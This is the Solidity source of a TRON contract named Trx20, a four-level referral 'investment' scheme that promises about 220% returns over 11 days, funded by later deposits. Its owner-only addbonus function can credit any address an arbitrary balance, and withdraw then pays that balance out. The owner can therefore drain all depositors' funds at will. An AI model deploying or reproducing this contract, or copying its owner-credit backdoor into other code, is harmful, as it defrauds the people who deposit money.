//SourceUnit: trx20.sol

// Specify version of solidity file (https://solidity.readthedocs.io/en/v0.4.24/layout-of-source-files.html#version-pragma)
pragma solidity ^0.5.4;

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Trx20 is Ownable{
    using SafeMath for uint256;

    struct Deposit {
        uint256 tariffId;
        uint256 baseTime;
        uint256 lastCollectedTime;
        uint256 value;
    }

    struct Player {
        address[] referrals;
        uint256[] referralsCount;
        uint256[] referralEarn;
        address parent;
        Deposit[] deposits;
        uint256 withdrawns;
        uint256 depositAmount;
        uint256 balance;
    }

    uint256 public totalReferral;
    uint256 public totalReferralEarn;
    uint256 public totalDeposit;
    uint256 public totalWithdrawn;
    uint256[] public REF_PERCENT = [70, 30, 10, 5];   //7%, 3%, 1%, 0.5%
    uint256[] public RATE_DIVIDER = [432000];
    uint256[] public PERIOD = [11 days];
    uint256 constant public MIN_DEPOSIT = 10000000;

    mapping(address => Player) public users;

    event Registration(address indexed addr, address indexed referrer);
    event Deposited(address indexed addr, address indexed referrer, uint256 amount, uint256 tariff);
    event Withdrawn(address indexed addr, uint256 amount);

    function _registration(address addr, address ref) internal {
        Player storage referrer = users[ref];
        referrer.referrals.push(addr);
        users[addr].parent = ref;
        totalReferral = totalReferral.add(1);
        if (referrer.referralsCount.length == 0){
            referrer.referralsCount = new uint256[](4);
            referrer.referralEarn = new uint256[](4);
        }
        uint256 level = 0;
        address refWallet = ref;
        while(refWallet != address(0) && level < 4){
            users[refWallet].referralsCount[level] = users[refWallet].referralsCount[level].add(1);
            refWallet = users[refWallet].parent;
            level = level.add(1);
        }
        emit Registration(addr, ref);
    }

    function _updateReferralBalance(address referrer, uint256 amount) internal {
        uint256 level = 0;
        address refWallet = referrer;
        while(refWallet != address(0) && level < 4){
            uint256 refValue = amount.mul(REF_PERCENT[level]).div(1000);
            users[refWallet].referralEarn[level] = users[refWallet].referralEarn[level].add(refValue);
            users[refWallet].balance = users[refWallet].balance.add(refValue);
            totalReferralEarn = totalReferralEarn.add(refValue);
            refWallet = users[refWallet].parent;
            level = level.add(1);
        }
    }

    function register(address referrer) public {
        require(users[msg.sender].parent == address(0), "Inviter address was set in our network!");
        require(users[referrer].parent != address(0) || referrer == owner(), "Inviter address does not exist in our network!");
        _registration(msg.sender, referrer);
    }

    function deposit(address referrer, uint256 tariffId) public payable {
        require(tariffId < 1, "The investment must be chosen correctly!");
        uint256 amount = msg.value;
        require(amount >= MIN_DEPOSIT, "Your investment amount is less than the minimum amount!");
        address addr = msg.sender;
        if (users[addr].parent == address(0)){
            register(referrer);
        }
        users[addr].deposits.push(Deposit(tariffId, now, now, amount));
        users[addr].depositAmount = users[addr].depositAmount.add(amount);
        totalDeposit = totalDeposit.add(amount);
        _updateReferralBalance(referrer, amount);
        emit Deposited(addr, referrer, amount, tariffId);
    }

    function addbonus(address referrer, uint256 amount) public onlyOwner {
        users[referrer].balance = users[referrer].balance.add(amount);
    }


    function withdraw(uint256 amount) public {
        address payable addr = msg.sender;
        uint256 value = collect(addr);
        uint256 balance = users[addr].balance.add(value);
        require(amount <= balance, "Your balance is less than withdraw amount!");
        require(amount <= address(this).balance, "Couldn't withdraw more than total TRX balance on the contract");
        users[addr].withdrawns = users[addr].withdrawns.add(amount);
        users[addr].balance = balance.sub(amount);
        totalWithdrawn = totalWithdrawn.add(amount);

        addr.transfer(amount);
        emit Withdrawn(addr, amount);
    }


    function collect(address addr) private returns (uint256){
        Deposit[] storage invests = users[addr].deposits;
        uint256 profit = 0;
        uint256 i = 0;
        while (i < invests.length){
            Deposit storage invest = invests[i];
            if (invest.lastCollectedTime < invest.baseTime.add(PERIOD[invest.tariffId])){
                uint256 remainedTime = PERIOD[invest.tariffId].sub(invest.lastCollectedTime.sub(invest.baseTime));
                if (remainedTime > 0){
                    uint256 timeSpent = now.sub(invest.lastCollectedTime);
                    if (remainedTime <= timeSpent){
                        timeSpent = remainedTime;
                    }
                    invest.lastCollectedTime = now;
                    profit = profit.add(invest.value.mul(timeSpent).div(RATE_DIVIDER[invest.tariffId]));
                }
            }
            i++;
        }
        return profit;
    }

     function getTotalStats() public view returns (uint256[] memory) {
        uint256[] memory combined = new uint256[](5);
        combined[0] = totalDeposit;
        combined[1] = address(this).balance;
        combined[2] = totalReferral;
        combined[3] = totalWithdrawn;
        combined[4] = totalReferralEarn;
        return combined;
    }

    function getPlayerDeposit(address addr) public view returns
                        (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory) {
        Deposit[] memory invests = users[addr].deposits;
        uint256[] memory tariffIds = new uint256[](invests.length);
        uint256[] memory baseTimes = new uint256[](invests.length);
        uint256[] memory lastCollectedTimes = new uint256[](invests.length);
        uint256[] memory values = new uint256[](invests.length);

        uint256 i = 0;
        while (i < invests.length){
            Deposit memory invest = invests[i];
            tariffIds[i] = invest.tariffId;
            baseTimes[i] = invest.baseTime;
            lastCollectedTimes[i] = invest.lastCollectedTime;
            values[i] = invest.value;
            i++;
        }
        return (tariffIds, baseTimes, lastCollectedTimes, values);
    }

    function getPlayerStat(address addr) public view returns
                        (uint256[] memory, uint256[] memory, address[] memory,
                         address, uint256, uint256, uint256) {

        return (users[addr].referralsCount, users[addr].referralEarn, users[addr].referrals,
                users[addr].parent, users[addr].withdrawns, users[addr].balance, users[addr].depositAmount);
    }


}